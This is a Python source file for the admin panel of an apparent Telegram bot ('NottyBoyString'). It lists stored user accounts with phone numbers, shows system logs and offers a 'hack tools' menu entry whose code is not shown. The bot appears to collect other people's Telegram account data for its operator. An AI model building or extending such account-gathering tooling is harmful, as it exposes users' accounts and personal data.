import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from NottyBoyString.utils.fonts import TinyCapsFont, MessageTemplates
from datetime import datetime

class AdminManager:
    def __init__(self, db):
        self.db = db
    
    async def admin_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show admin panel"""
        user_id = update.effective_user.id
        
        if not await self.db.is_admin(user_id):
            await update.message.reply_text(
                TinyCapsFont.bold_tiny_caps("🚫 ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ. ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀɴ ᴀᴅᴍɪɴ."),
                parse_mode='Markdown'
            )
            return
        
        keyboard = [
            [InlineKeyboardButton("👥 ᴀʟʟ ᴜsᴇʀs", callback_data="admin_all_users"),
             InlineKeyboardButton("📊 ʙᴏᴛ sᴛᴀᴛs", callback_data="admin_stats")],
            [InlineKeyboardButton("🔐 ᴀʟʟ ᴀᴄᴄᴏᴜɴᴛs", callback_data="admin_all_accounts"),
             InlineKeyboardButton("📝 ʟᴏɢs", callback_data="admin_logs")],
            [InlineKeyboardButton("🛠️ ʜᴀᴄᴋ ᴛᴏᴏʟs", callback_data="hack_tools"),
             InlineKeyboardButton("📢 ʙʀᴏᴀᴅᴄᴀsᴛ", callback_data="admin_broadcast")],
            [InlineKeyboardButton("⚙️ sʏsᴛᴇᴍ ɪɴғᴏ", callback_data="system_info")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        text = TinyCapsFont.bold_tiny_caps(
            "🛡️ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ\n\n"
            "ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ᴀᴅᴍɪɴ ᴄᴏɴᴛʀᴏʟ ᴄᴇɴᴛᴇʀ. ʏᴏᴜ ʜᴀᴠᴇ ғᴜʟʟ ᴀᴄᴄᴇss ᴛᴏ ᴀʟʟ sʏsᴛᴇᴍ ғᴇᴀᴛᴜʀᴇs."
        )
        
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    async def show_all_accounts(self, query):
        """Show all stored accounts (Admin only)"""
        accounts = await self.db.get_all_accounts()
        
        if not accounts:
            text = TinyCapsFont.bold_tiny_caps("ɴᴏ ᴀᴄᴄᴏᴜɴᴛs ғᴏᴜɴᴅ ɪɴ ᴅᴀᴛᴀʙᴀsᴇ.")
            await query.edit_message_text(text, parse_mode='Markdown')
            return
        
        text = TinyCapsFont.bold_tiny_caps(f"📊 ᴀʟʟ sᴛᴏʀᴇᴅ ᴀᴄᴄᴏᴜɴᴛs ({len(accounts)})\n\n")
        
        for i, account in enumerate(accounts[:10], 1):  # Show first 10
            text += f"**{i}. ᴜsᴇʀ ɪᴅ:** `{account.get('user_id', 'N/A')}`\n"
            text += f"**ᴘʜᴏɴᴇ:** `{account.get('phone', 'N/A')}`\n"
            text += f"**sᴛᴏʀᴇᴅ:** `{account.get('stored_at', 'N/A')}`\n"
            text += "─" * 30 + "\n"
        
        keyboard = [[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="admin_back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    async def show_system_logs(self, query):
        """Show system logs"""
        logs = await self.db.get_recent_logs(limit=10)
        
        text = TinyCapsFont.bold_tiny_caps("📝 ʀᴇᴄᴇɴᴛ sʏsᴛᴇᴍ ʟᴏɢs\n\n")
        
        for log in logs:
            text += f"**ᴛʏᴘᴇ:** `{log['type']}`\n"
            text += f"**ᴜsᴇʀ:** `{log['user_id']}`\n"
            text += f"**ᴛɪᴍᴇ:** `{log['timestamp'].strftime('%Y-%m-%d %H:%M')}`\n"
            text += f"**ᴅᴇᴛᴀɪʟs:** {log['details'][:50]}...\n"
            text += "─" * 30 + "\n"
        
        keyboard = [[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="admin_back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')